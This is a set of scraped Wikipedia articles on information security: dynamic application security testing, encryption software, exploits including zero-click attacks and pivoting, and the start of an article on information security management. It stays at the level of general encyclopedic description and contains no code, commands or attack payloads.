Rieck, Konrad; Krueger, Tammo; Dewald, Andreas (6 December 2010). 
"Cujo: Efficient detection and prevention of drive-by-download attacks"
. 
Proceedings of the 26th Annual Computer Security Applications Conference
. New York, NY, USA: ACM. pp. 31–39. 
doi
:
10.1145/1920261.1920267
. 
ISBN
 
9781450301336
. 
S2CID
 
8512207
.






v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Drive-by_download&oldid=1239767532
"


Categories
: 
Computer security exploits
Computer viruses
Hidden categories: 
CS1 errors: periodical ignored
Articles with short description
Short description is different from Wikidata
Use dmy dates from July 2020











From Wikipedia, the free encyclopedia






Testing process to determine security weaknesses


Dynamic application security testing
 (
DAST
) represents a non-functional testing process to identify security weaknesses and vulnerabilities in an application. This testing process can be carried out either manually or by using automated tools. Manual assessment of an application involves human intervention to identify the security flaws which might slip from an automated tool. Usually business logic errors, race condition checks, and certain zero-day vulnerabilities can only be identified using manual assessments.

On the other side, a DAST tool is a program which communicates with a web application through the web front-end in order to identify potential security vulnerabilities in the web application and architectural weaknesses.
[
1
]
 It performs a 
black-box
 test. Unlike 
static application security testing
 tools, DAST tools do not have access to the source code and therefore detect 
vulnerabilities
 by actually performing attacks.

DAST tools allow sophisticated scans, detecting vulnerabilities with minimal user interactions once configured with host name, crawling parameters and authentication credentials. These tools will attempt to detect vulnerabilities in query strings, headers, fragments, verbs (GET/POST/PUT) and DOM injection.





Overview
[
edit
]


DAST tools facilitate the automated review of a web application with the express purpose of discovering security vulnerabilities and are required to comply with various regulatory requirements. Web application scanners can look for a wide variety of vulnerabilities, such as input/output validation: (e.g. 
cross-site scripting
 and 
SQL injection
), specific application problems and server configuration mistakes.



Commercial and open-source scanners
[
edit
]


Commercial scanners are a category of web-assessment tools which need to be purchased. Some scanners include some free features but most need to be bought for full access to the tool's power.

Open-source scanners are often free of cost to the user.



Strengths
[
edit
]


These tools can detect vulnerabilities of the finalized 
release candidate
 versions prior to shipping. Scanners simulate a malicious user by attacking and probing, identifying results which are not part of the expected result set, allowing for a realistic attack simulation.
[
2
]
 The big advantage of these types of tools are that they can scan year-round to be constantly searching for vulnerabilities. With new vulnerabilities being discovered regularly this allows companies to find and patch vulnerabilities before they can become exploited.
[
3
]


As a dynamic testing tool, web scanners are not language-dependent. A web application scanner is able to scan engine-driven web applications. Attackers use the same tools, so if the tools can find a vulnerability, so can attackers.
[
4
]




Weaknesses
[
edit
]


While scanning with a DAST tool, data may be overwritten or malicious payloads injected into the subject site. Sites should be scanned in a production-like but non-production environment to ensure accurate results while protecting the data in the production environment.

Because the tool is implementing a 
dynamic testing
 method, it cannot cover 100% of the source code of the application and then, the application itself. The penetration tester should look at the coverage of the web application or of its 
attack surface
 to know if the tool was configured correctly or was able to understand the web application.

The tool cannot implement all variants of attacks for a given vulnerability. So the tools generally have a predefined list of attacks and do not generate the attack payloads depending on the tested web application. Some tools are also quite limited in their understanding of the behavior of applications with dynamic content such as 
JavaScript
 and 
Flash
.



See also
[
edit
]


Security testing


Static application security testing


Interactive application security testing


References
[
edit
]






^
 
Web Application Security Scanner Evaluation Criteria version 1.0
, WASC, 2009




^
 
"SAST vs DAST"
. 
G2 Research Hub
. 
Archived
 from the original on 2020-05-03.




^
 
"The Importance of Regular Vulnerability Scanning"
. 
AppCheck Ltd
. 
Archived
 from the original on 2020-08-06.




^
 
Bashvitz, Gadi. 
"DAST Pros and Cons"
. 
Bright Security
. Retrieved 
2023-03-21
.






External links
[
edit
]


Web Application Security Scanner Evaluation Criteria
 from the 
Web Application Security Consortium
 (WASC)


Web Application Scanners
, operated by the 
NIST


Challenges faced by automated web application security assessment
 from Robert Auger


The WASC security scanner list










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Dynamic_application_security_testing&oldid=1244990751
"


Categories
: 
Security testing
Dynamic program analysis
Hidden categories: 
Articles with short description
Short description is different from Wikidata











From Wikipedia, the free encyclopedia






Software that uses cryptography


Encryption software
 is 
software
 that uses 
cryptography
 to prevent unauthorized access to digital information.
[
1
]
[
2
]
 Cryptography is used to protect digital information on 
computers
 as well as the digital information that is sent to other computers over the 
Internet
.
[
3
]






Classification
[
edit
]


There are many software products which provide encryption. Software encryption uses a 
cipher
 to obscure the content into 
ciphertext
. One way to classify this type of software is the type of cipher used. Ciphers can be divided into two categories: 
public key
 ciphers (also known as asymmetric ciphers), and 
symmetric key
 ciphers.
[
4
]
 Encryption software can be based on either public key or symmetric key encryption.

Another way to classify software encryption is to categorize its purpose. Using this approach, software encryption may be classified into software which encrypts "
data in transit
" and software which encrypts "
data at rest
". Data in transit generally uses public key ciphers, and data at rest generally uses symmetric key ciphers.

Symmetric key ciphers can be further divided into stream ciphers and block ciphers. Stream ciphers typically encrypt plaintext a bit or byte at a time, and are most commonly used to encrypt real-time communications, such as audio and video information. The key is used to establish the initial state of a keystream generator, and the output of that generator is used to encrypt the plaintext.  Block cipher algorithms split the plaintext into fixed-size blocks and encrypt one block at a time. For example, AES processes 16-byte blocks, while its predecessor DES encrypted blocks of eight bytes.

There is also a well-known case where PKI is used for data in transit of data at rest.



Data in transit
[
edit
]


Data in transit is data that is being sent over a 
computer network
. When the data is between two endpoints, any confidential information may be vulnerable. The payload (confidential information) can be encrypted to secure its confidentiality, as well as its integrity and validity.
[
5
]


Often, the data in transit is between two entities that do not know each other - such as in the case of visiting a website. As establishing a relationship and securely sharing an encryption key to secure the information that will be exchanged, a set of roles, policies, and procedures to accomplish this has been developed; it is known as the 
public key infrastructure
, or PKI. Once PKI has established a secure connection, a symmetric key can be shared between endpoints. A symmetric key is preferred over the private and public keys as a symmetric cipher is much more efficient (uses fewer CPU cycles) than an asymmetric cipher.
[
6
]
[
7
]
 There are several methods for encrypting data in transit, such as 
IPsec
, 
SCP
, 
SFTP
, 
SSH
, 
OpenPGP
 and 
HTTPS
.



Data at rest
[
edit
]


Data at rest refers to data that has been saved to 
persistent storage
. Data at rest is generally encrypted by a 
symmetric key
.

Encryption may be applied at different layers in the storage stack. For example, encryption can be configured at the 
disk
 layer, on a subset of a disk called a 
partition
, on a 
volume
, which is a combination of disks or partitions, at the layer of a 
file system
, or within 
user space
 applications such as 
database
 or other applications that run on the host 
operating system
.

With full disk encryption, the entire disk is encrypted (except for the bits necessary to boot or access the disk when not using an unencrypted boot/preboot partition).
[
8
]
 As disks can be partitioned into multiple partitions, partition encryption can be used to encrypt individual disk partitions.
[
9
]
 Volumes, created by combining two or more partitions, can be encrypted using 
volume encryption
.
[
10
]
 File systems, also composed of one or more partitions, can be encrypted using 
filesystem-level encryption
. Directories are referred to as encrypted when the files within the directory are encrypted.
[
11
]
[
12
]
 File encryption encrypts a single file. Database encryption acts on the data to be stored, accepting unencrypted information and writing that information to persistent storage only after it has encrypted the data.  Device-level encryption, a somewhat vague term that includes encryption-capable tape drives, can be used to offload the encryption tasks from the CPU.



Transit of data at rest
[
edit
]


When there is a need to securely transmit data at rest, without the ability to create a secure connection, user space tools have been developed that support this need. These tools rely upon the receiver publishing their public key, and the sender being able to obtain that public key. The sender is then able to create a symmetric key to encrypt the information, and then use the receiver's public key to securely protect the transmission of the information and the symmetric key. This allows secure transmission of information from one party to another. 
[
citation needed
]




Performance
[
edit
]


The performance of encryption software is measured relative to the speed of the CPU. Thus, 
cycles per byte
 (sometimes abbreviated 
cpb
), a unit indicating the number of 
clock cycles
 a 
microprocessor
 will need per 
byte
 of data processed, is the usual 
unit of measurement
.
[
13
]
 Cycles per byte serve as a partial indicator of real-world 
performance
 in 
cryptographic
 
functions
.
[
14
]
 Applications may offer their own encryption called native encryption, including databases applications such as Microsoft SQL, Oracle, and MongoDB, and commonly rely on direct usage of CPU cycles for performance. This often impacts the desirability of encryption in businesses seeking greater security and ease of satisfying compliance by impacting the speed and scale of how data within organizations through to their partners.
[
15
]




See also
[
edit
]


Cryptographic Protocol


Public Key (Asymmetric) Algorithms


Symmetric Algorithms


Transport Layer Security


Comparison of disk encryption software


Defense strategy (computing)


Ransomware
: Malicious software using encryption


References
[
edit
]






^
 
Thakur, Dinesh. 
"Cryptography - What is Cryptography?"
.




^
 
"What is encryption? - Definition from WhatIs.com"
. 
SearchSecurity
. Retrieved 
25 April
 2017
.




^
 
"Why We Encrypt - Schneier on Security"
.




^
 
Chandra, Sourabh; Paira, Smita; Alam, Sk Safikul; Sanyal, Goutam (Nov 2014). 
"A comparative survey of Symmetric and Asymmetric Key Cryptography"
. 
IEEE
: 83–93. 
doi
:
10.1109/ICECCE.2014.7086640
. 
ISBN
 
978-1-4799-5748-4
. 
S2CID
 
377667
.




^
 
"Guide to Cryptography - OWASP"
.




^
 
Villanueva, John Carl. 
"Symmetric vs Asymmetric Encryption"
.




^
 
"Symmetric vs. Asymmetric Encryption - CipherCloud"
. 4 October 2013. Archived from 
the original
 on 15 August 2018
. Retrieved 
27 March
 2017
.




^
 
"How Whole Disk Encrypytion Works"
 
(PDF)
. Archived from 
the original
 
(PDF)
 on 2017-03-23
. Retrieved 
2017-03-27
.




^
 
"How to encrypt a single partition in Linux - TechRepublic"
.




^
 
https://www.jetico.com/web_help/bcve3_enterprise/html/01_introduction/02_what_is_ve.htm
 Volume Encryption




^
 
"How IT Works: Encrypting File System"
.




^
 
"PDS Software Solutions LLC"
. Archived from 
the original
 on 2018-07-19
. Retrieved 
2017-03-27
.




^
 
"Processor allocation"
.




^
 
"Engineering comparison of SHA-3 candidates"
. Archived from 
the original
 on 2019-10-13
. Retrieved 
2019-09-24
.




^
 
"Businesses fail to apply encryption technology effectively"
. 
ComputerWeekly.com
. Retrieved 
2020-04-23
.






External links
[
edit
]


‹ The 
template
 below (
Curlie
) is being considered for deletion. See 
templates for discussion
 to help reach a consensus. ›
Encryption software
 at 
Curlie


v
t
e
Cryptographic software
Email clients


Apple Mail


Autocrypt


Claws Mail


Enigmail


GPG
 (
Gpg4win
)


Kontact


Outlook


p≡p


PGP


Sylpheed


Thunderbird


Secure
communication
OTR


Adium


BitlBee


Centericq


ChatSecure


climm


Jitsi


Kopete


Profanity


SSH


Dropbear


lsh


OpenSSH


PuTTY


SecureCRT


WinSCP


wolfSSH


TLS & SSL


BBM Enterprise


Bouncy Castle


BoringSSL


Botan


cryptlib


GnuTLS


JSSE


LibreSSL


MatrixSSL


NSS


OpenSSL


mbed TLS


BSAFE


SChannel


SSLeay


stunnel


TeamNote


wolfSSL


VPN


Check Point VPN-1


Hamachi


Openswan


OpenVPN


SoftEther VPN


strongSwan


Tinc


WireGuard


ZRTP


Jitsi


Linphone


Jami


Zfone


P2P


Bitmessage


Briar


RetroShare


Tox


DRA


Matrix


OMEMO


Cryptocat


ChatSecure


Proteus


Session


Signal Protocol


Facebook Messenger


Google Allo


Google Messages


Signal


TextSecure


WhatsApp


SimpleX


Disk encryption
(
Comparison
)


BestCrypt


BitLocker


CrossCrypt


Cryptoloop


dm-crypt


DriveSentry


E4M


eCryptfs


FileVault


FreeOTFE


GBDE


geli


LUKS


PGPDisk


Private Disk


Scramdisk


Sentry 2020


TrueCrypt


History


VeraCrypt


Anonymity


GNUnet


I2P


Java Anon Proxy


Tor


Vidalia


RetroShare


Ricochet


Wickr


File systems
 
(
List
)


EncFS


EFS


eCryptfs


LUKS


PEFS


Rubberhose


StegFS


Tahoe-LAFS


Security-focused
operating system


Tails


Qubes


Service providers


Freenet


Tresorit


Wuala


NordLocker


Educational


CrypTool


Anti–computer forensics


USBKill


BusKill


Related topics


Outline of cryptography


Timeline of cryptography


Hash functions


Cryptographic hash function


List of hash functions


Homomorphic encryption


End-to-end encryption


S/MIME




 
Category


 
Commons












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Encryption_software&oldid=1231806682
"


Category
: 
Cryptographic software
Hidden categories: 
Articles with short description
Short description is different from Wikidata
All articles with unsourced statements
Articles with unsourced statements from November 2021
Articles with Curlie links











From Wikipedia, the free encyclopedia






Method of attack on computer systems


This article's 
lead section
 may be too long
.
 Please read the 
length guidelines
 and help 
move details into the article's body
.
 
(
August 2024
)


An 
exploit
 is a method or piece of code that takes advantage of 
vulnerabilities
 in 
software
, 
applications
, 
networks
, 
operating systems
, or 
hardware
, typically for malicious purposes.
The term "exploit" derives from the English verb "to exploit," meaning "to use something to one’s own advantage."
Exploits are designed to identify flaws, bypass security measures, gain unauthorized access to systems, take control of systems, install 
malware
, or 
steal sensitive data
.
While an exploit by itself may not be a 
malware
, it serves as a vehicle for delivering malicious software by breaching 
security controls
.
[
1
]
[
2
]
[
3
]
[
4
]


Exploits target vulnerabilities, which are essentially flaws or weaknesses in a system's defenses.
Common targets for exploits include 
operating systems
, 
web browsers
, and various 
applications
, where hidden vulnerabilities can compromise the integrity and 
security
 of 
computer systems
.
Exploits can cause unintended or unanticipated behavior in systems, potentially leading to severe 
security breaches
.
[
5
]
[
6
]


Many exploits are designed to provide 
superuser
-level access to a computer system.
Attackers may use multiple exploits in succession to first gain low-level access and then 
escalate privileges
 repeatedly until they reach the highest administrative level, often referred to as "root."
This technique of chaining several exploits together to perform a single attack is known as an exploit chain.

Exploits that remain unknown to everyone except the individuals who discovered and developed them are referred to as zero-day or "0day" exploits.
After an exploit is disclosed to the authors of the affected software, the associated vulnerability is often fixed through a 
patch
, rendering the exploit unusable.
This is why some 
black hat hackers
, as well as military or intelligence agency hackers, do not publish their exploits but keep them private.
One scheme that offers zero-day exploits is known as 
exploit as a service
.
[
7
]


Researchers estimate that malicious exploits cost the 
global economy
 over US$450 billion annually.
In response to this threat, organizations are increasingly utilizing 
cyber threat intelligence
 to identify vulnerabilities and prevent hacks before they occur.
[
8
]






Classification
[
edit
]


There are several methods of classifying exploits. The most common is by how the exploit communicates to the vulnerable software.

A 
remote exploit
 works over a network and exploits the security vulnerability without any prior access to the vulnerable system.

A 
local exploit
 requires prior access or physical access to the vulnerable system, and usually increases the privileges of the person running the exploit past those granted by the system administrator. Exploits against client applications also exist, usually consisting of modified servers that send an exploit if accessed with a client application. A common form of exploits against client applications are 
browser exploits
. Exploits against client applications may also require some interaction with the user and thus may be used in combination with the 
social engineering
 method. 

Another classification is by the action against the vulnerable system; unauthorized data access, arbitrary code execution, and denial of service are examples.

Exploitations are commonly categorized and named
[
9
]
[
10
]
 by the type of vulnerability they exploit 
(see 
vulnerabilities
 for a list)
[
clarification needed
]
, whether they are local/remote and the result of running the exploit (e.g. 
EoP
, 
DoS
, 
spoofing
). 



Zero-click
[
edit
]


A zero-click attack is an exploit that requires no 
user interaction
 to operate – that is to say, no key-presses or mouse clicks.
[
11
]
 
FORCEDENTRY
, discovered in 2021, is an example of a zero-click attack.
[
12
]
[
13
]


These exploits are commonly the most sought after exploits (specifically on the underground exploit market) because the target typically has no way of knowing they have been compromised at the time of exploitation.

In 2022, 
NSO Group
 was reportedly selling zero-click exploits to governments for breaking into individuals' phones.
[
14
]




Pivoting
[
edit
]


This section 
may contain material 
not related to the topic of the article
  and should be moved to 
Pivoting
 instead.
 Please help 
improve this section
 or discuss this issue on the 
talk page
.
 
(
August 2024
)
 (
Learn how and when to remove this message
)


Pivoting is a technique employed by both hackers and 
penetration testers
 to expand their access within a target network. By compromising a system, attackers can leverage it as a platform to target other systems that are typically shielded from direct external access by 
firewalls
. Internal networks often contain a broader range of accessible machines compared to those exposed to the internet. For example, an attacker might compromise a web server on a corporate network and then utilize it to target other systems within the same network. This approach is often referred to as a multi-layered attack. Pivoting is also known as 
island hopping
.

Pivoting can further be distinguished into 
proxy
 pivoting and 
VPN
 pivoting:



Proxy pivoting is the practice of channeling traffic through a compromised target using a proxy payload on the machine and launching attacks from the computer.
[
15
]
 This type of pivoting is restricted to certain 
TCP
 and 
UDP
 ports that are supported by the proxy.


VPN pivoting enables the attacker to create an encrypted layer to tunnel into the compromised machine to route any network traffic through that target machine, for example, to run a vulnerability scan on the internal network through the compromised machine, effectively giving the attacker full network access as if they were behind the firewall.


Typically, the proxy or VPN applications enabling pivoting are executed on the target computer as the 
payload
 of an exploit.

Pivoting is usually done by infiltrating a part of a network infrastructure (as an example, a vulnerable printer or thermostat) and using a scanner to find other devices connected to attack them. By attacking a vulnerable piece of networking, an attacker could infect most or all of a network and gain complete control.



See also
[
edit
]




Computer security


Computer virus


Crimeware


Exploit kit


Hacking: The Art of Exploitation
 (second edition)


IT risk


Metasploit


Shellcode


w3af




Notes
[
edit
]






^
 


Latto, Nica (2020-09-29). 
"Exploits: What You Need to Know"
. 
Exploits: What You Need to Know
. 
Archived
 from the original on 2024-05-15
. Retrieved 
2024-08-12
. 
An exploit is any attack that takes advantage of vulnerabilities in applications, networks, operating systems, or hardware. Exploits usually take the form of software or code that aims to take control of computers or steal network data.




^
 


"What Is an Exploit?"
. 
Cisco
. 2023-10-06. 
Archived
 from the original on 2024-05-31
. Retrieved 
2024-08-12
. 
An exploit is a program, or piece of code, designed to find and take advantage of a security flaw or vulnerability in an application or computer system, typically for malicious purposes such as installing malware. An exploit is not malware itself, but rather it is a method used by cybercriminals to deliver malware.




^
 


Gonzalez, Joaquin Jay III; Kemp, Roger L. (2019-01-25). 
Cybersecurity: Current Writings on Threats and Protection
. Jefferson, North Carolina: McFarland & Company. p. 241. 
ISBN
 
978-1-4766-3541-5
. 
A technique to breach the security of a network or information system in violation of security policy.




^
 


"OWASP Secure Coding Practices"
. 
OWASP Foundation
. 
Archived
 from the original on 2024-01-06
. Retrieved 
2024-08-12
. 
To take advantage of a vulnerability. Typically this is an intentional action designed to compromise the software's security controls by leveraging a vulnerability.




^
 


"Exploit Definition"
. 
Malwarebytes
. 2024-04-15. 
Archived
 from the original on 2024-05-16
. Retrieved 
2024-08-12
. 
A computer exploit is a type of malware that takes advantage of bugs or vulnerabilities, which cybercriminals use to gain illicit access to a system. These vulnerabilities are hidden in the code of the operating system and its applications just waiting to be discovered and put to use by cybercriminals. Commonly exploited software includes the operating system itself, browsers, Microsoft Office, and third-party applications.




^
 


"Obtain Capabilities: Exploits, Sub-technique T1588.005"
. 
MITRE ATT&CK®
. 2020-10-15. 
Archived
 from the original on 2024-05-24
. Retrieved 
2024-08-12
. 
Adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software.




^
 
Leyden, J. (16 November 2021). 
"Exploit-as-a-service: Cybercriminals exploring potential of leasing out zero-day vulnerabilities"
. PortSwigger Ltd
. Retrieved 
18 December
 2023
.




^
 
Indiana University, Bloomington; Samtani, Sagar; Chai, Yidong; Hefei University of Technology; Chen, Hsinchun; University of Arizona (2022-05-24). 
"Linking Exploits from the Dark Web to Known Vulnerabilities for Proactive Cyber Threat Intelligence: An Attention-Based Deep Structured Semantic Model"
. 
MIS Quarterly
. 
46
 (2): 911–946. 
doi
:
10.25300/MISQ/2022/15392
.




^
 
"Exploits Database by Offensive Security"
. 
www.exploit-db.com
.




^
 
"Exploit Database | Rapid7"
. 
www.rapid7.com
.




^
 
"Sneaky Zero-Click Attacks Are a Hidden Menace"
. 
Wired
. 
ISSN
 
1059-1028
. Retrieved 
2021-09-14
.




^
 
"The Stealthy iPhone Hacks That Apple Still Can't Stop"
. 
Wired
. 
ISSN
 
1059-1028
. Retrieved 
2021-09-14
.




^
 
"A new NSO zero-click attack evades Apple's iPhone security protections, says Citizen Lab"
. 
TechCrunch
. 24 August 2021. 
Archived
 from the original on 2021-08-24
. Retrieved 
2021-09-14
.




^
 
Ryan Gallagher (February 18, 2022). 
"Beware of 'Zero-Click' Hacks That Exploit Security Flaws in Phones' Operating Systems"
. 
Insurance Journal
.




^
 
"Metasploit Basics – Part 3: Pivoting and Interfaces"
. 
Digital Bond
.






External links
[
edit
]


 Media related to 
Computer security exploits
 at Wikimedia Commons


Authority control databases
: National 
France
BnF data


v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Exploit_(computer_security)&oldid=1246131138
"


Category
: 
Computer security exploits
Hidden categories: 
Articles with short description
Short description is different from Wikidata
Wikipedia introduction cleanup from August 2024
All pages needing cleanup
Articles covered by WikiProject Wikify from August 2024
All articles covered by WikiProject Wikify
Wikipedia articles needing clarification from August 2024
Wikipedia articles that may have off-topic sections from August 2024
All articles that may have off-topic sections
Commons category link is on Wikidata











From Wikipedia, the free encyclopedia






Controls an organization requires for IT security


Information security management
 (
ISM
) defines and manages controls that an organization needs to implement to ensure that it is sensibly protecting the 
confidentiality
, availability, and integrity of 
assets
 from 
threats
 and 
vulnerabilities
. The core of ISM includes 
information risk management
, a process that involves the assessment of the risks an organization must deal with in the management and protection of assets, as well as the dissemination of the risks to all appropriate 
stakeholders
.
[
1
]
 This requires proper asset identification and valuation steps, including evaluating the value of 
confidentiality
, 
integrity
, 
availability
, and replacement of assets.
[
2
]
 As part of information security management, an organization may implement an information security management system and other best practices found in the 
ISO/IEC 27001
, 
ISO/IEC 27002
, and ISO/IEC 27035 standards on 
information security
.
[
3
]
[
4
]






Risk management and mitigation
[
edit
]


Managing information security in essence means managing and mitigating the various threats and vulnerabilities to assets, while at the same time balancing the management effort expended on potential threats and vulnerabilities by gauging the probability of them actually occurring.
[
1
]
[
5
]
[
6
]
 A meteorite crashing into a 
server room
 is certainly a threat, for example, but an information security officer will likely put little effort into preparing for such a threat. Just as people don't have to start preparing for the end of the world just because of the existence of a 
global seed bank
.
[
7
]


After appropriate asset identification and valuation have occurred,
[
2
]
 risk management and mitigation of risks to those assets involves the analysis of the following issues:
[
5
]
[
6
]
[
8
]




Threats: Unwanted events that could cause the deliberate or accidental loss, damage, or misuse of information assets


Vulnerabilities: How susceptible information assets and associated controls are to exploitation by one or more threats


Impact
 and likelihood: The magnitude of potential damage to information assets from threats and vulnerabilities and how serious of a risk they pose to the assets; 
cost–benefit analysis
 may also be part of the impact assessment or separate from it


Mitigation
: The proposed method(s) for minimizing the impact and likelihood of potential threats and vulnerabilities


Once a threat and/or vulnerability has been identified and assessed as having sufficient impact/likelihood on information assets, a mitigation plan can be enacted. The mitigation method is chosen largely depends on which of the seven information technology (IT) domains the threat and/or vulnerability resides in. The threat of user apathy toward security policies (the user domain) will require a much different mitigation plan than the one used to limit the threat of unauthorized probing and 
scanning
 of a network (the LAN-to-WAN domain).
[
8
]




Information security management system
[
edit
]


An information security management system (ISMS) represents the collation of all the interrelated/interacting information security elements of an organization so as to ensure policies, procedures, and objectives can be created, implemented, communicated, and evaluated to better guarantee the organization's overall information security. This system is typically influenced by an organization's needs, objectives, security requirements, size, and processes.
[
9
]
 An ISMS includes and lends to risk management and mitigation strategies. Additionally, an organization's adoption of an ISMS indicates that it is systematically identifying, assessing, and managing information security risks and "will be capable of successfully addressing information confidentiality, integrity, and availability requirements."
[
10
]
 However, the human factors associated with ISMS development, implementation, and practice (the user domain
[
8
]
) must also be considered to best ensure the ISMS' ultimate success.
[
11
]




Implementation and education strategy components
[
edit
]


Implementing an effective information security management (including risk management and mitigation) requires a management strategy that takes note of the following:
[
12
]




Upper-level management must strongly support information security initiatives, allowing information security officers the opportunity "to obtain the resources necessary to have a fully functional and effective education program" and, by extension, information security management system.


Information security strategy and training must be integrated into and communicated through departmental strategies to ensure all personnel is positively affected by the organization's information security plan.


A 
privacy
 training and awareness "
risk assessment
" can help an organization identify critical gaps in stakeholder knowledge and attitude towards security.


Proper evaluation methods for "measuring the overall effectiveness of the training and awareness program" ensure policies, procedures, and training materials remain relevant.


Policies and procedures that are appropriately developed, implemented, communicated, and enforced "mitigate risk and ensure not only risk reduction, but also ongoing compliance with applicable laws, regulations, standards, and policies."


Milestones
 and timelines for all aspects of information security management help ensure future success.


Without sufficient budgetary considerations for all the above—in addition to the money allotted to standard regulatory, IT, privacy, and security issues—an information security management plan/system can not fully succeed.



Relevant standards
[
edit
]


Standards that are available to assist organizations with implementing the appropriate programs and controls to mitigate threats and vulnerabilities include the 
ISO/IEC 27000
 family of standards, the 
ITIL framework
, the 
COBIT framework
, and 
O-ISM3 2.0
. The ISO/IEC 27000 family represents some of the most well-known standards governing information security management and their ISMS is based on global expert opinion. They lay out the requirements for best "establishing, implementing, deploying, monitoring, reviewing, maintaining, updating, and improving information security management systems."
[
3
]
[
4
]
 ITIL acts as a collection of concepts, policies, and best practices for the effective management of information technology infrastructure, service, and security, differing from ISO/IEC 27001 in only a few ways.
[
13
]
[
14
]
 COBIT, developed by 
ISACA
, is a framework for helping information security personnel develop and implement strategies for information management and governance while minimizing negative impacts and controlling information security and risk management,
[
4
]
[
13
]
[
15
]
 and 
O-ISM3
 2.0 is 
The Open Group
's technology-neutral information security model for enterprise.
[
16
]




See also
[
edit
]


Certified Information Systems Security Professional


Chief information security officer


Security information management


Security management


Risk management


References
[
edit
]






^ 
a
 
b
 
Campbell, T. (2016). "Chapter 1: Evolution of a Profession". 
Practical Information Security Management: A Complete Guide to Planning and Implementation
. APress. pp. 1–14. 
ISBN
 
9781484216859
.




^ 
a
 
b
 
Tipton, H.F.; Krause, M. (2003). 
Information Security Management Handbook
 (5th ed.). CRC Press. pp. 810–11. 
ISBN
 
9780203325438
.




^ 
a
 
b
 
Humphreys, E. (2016). 
"Chapter 2: ISO/IEC 27001 ISMS Family"
. 
Implementing the ISO/IEC 27001:2013 ISMS Standard
. Artech House. pp. 11–26. 
ISBN
 
9781608079315
.




^ 
a
 
b
 
c
 
Campbell, T. (2016). "Chapter 6: Standards, Frameworks, Guidelines, and Legislation". 
Practical Information Security Management: A Complete Guide to Planning and Implementation
. APress. pp. 71–94. 
ISBN
 
9781484216859
.




^ 
a
 
b
 
Watts, S. (21 June 2017). 
"IT Security Vulnerability vs Threat vs Risk: What's the Difference?"
. 
BMC Blogs
. BMC Software, Inc
. Retrieved 
16 June
 2018
.




^ 
a
 
b
 
Campbell, T. (2016). "Chapter 4: Organizational Security". 
Practical Information Security Management: A Complete Guide to Planning and Implementation
. APress. pp. 43–61. 
ISBN
 
9781484216859
.




^
 
Lundgren, Björn; Möller, Niklas (2019). 
"Defining Information Security"
. 
Science and Engineering Ethics
. 
25
 (2): 419–441. 
doi
:
10.1007/s11948-017-9992-1
. 
ISSN
 
1353-3452
. 
PMC
 
6450831
. 
PMID
 
29143269
.




^ 
a
 
b
 
c
 
Kim, D.; Solomon, M.G. (2016). 
"Chapter 1: Information Systems Security"
. 
Fundamentals of Information Systems Security
. Jones & Bartlett Learning. pp. 2–46. 
ISBN
 
9781284128239
.




^
 
Terroza, A.K.S. (12 May 2015). 
"Information Security Management System (ISMS) Overview"
 
(PDF)
. The Institute of Internal Auditors. Archived from 
the original
 
(PDF)
 on 7 August 2016
. Retrieved 
16 June
 2018
.




^
 
"Need: The Need for ISMS"
. 
Threat and Risk Management
. European Union Agency for Network and Information Security
. Retrieved 
16 June
 2018
.




^
 
Alavi, R.; Islam, S.; Mouratidis, H. (2014). "A Conceptual Framework to Analyze Human Factors of Information Security Management System (ISMS) in Organizations". 
Human Aspects of Information Security, Privacy, and Trust
. Lecture Notes in Computer Science. Vol. 8533. pp. 297–305. 
doi
:
10.1007/978-3-319-07620-1_26
. 
ISBN
 
978-3-319-07619-5
.
 
{{
cite book
}}
: 
|journal=
 ignored (
help
)




^
 
